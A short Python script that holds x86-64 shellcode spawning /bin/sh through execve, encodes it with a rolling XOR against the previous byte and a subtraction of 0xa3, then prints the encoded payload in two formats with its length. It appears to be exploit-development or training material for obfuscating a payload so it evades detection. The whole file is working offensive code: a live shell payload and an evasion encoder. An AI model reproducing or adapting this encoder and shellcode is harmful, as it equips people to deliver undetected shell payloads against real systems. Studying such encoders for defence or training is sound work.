#!/usr/bin/python

shellcode="\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
#print (shellcode)
encode=""
encode2=""
priv=0
for x in bytearray(shellcode):
	y=x^priv
	priv=x
	y=y-0xa3
	encode+="\\x"
        encode+="%02x"%(y & 0xff)
        encode2+="0x"
        encode2+="%02x,"%(y & 0xff)
print (encode)
print (encode2)

print ("length:"+str(len(bytearray(shellcode))))
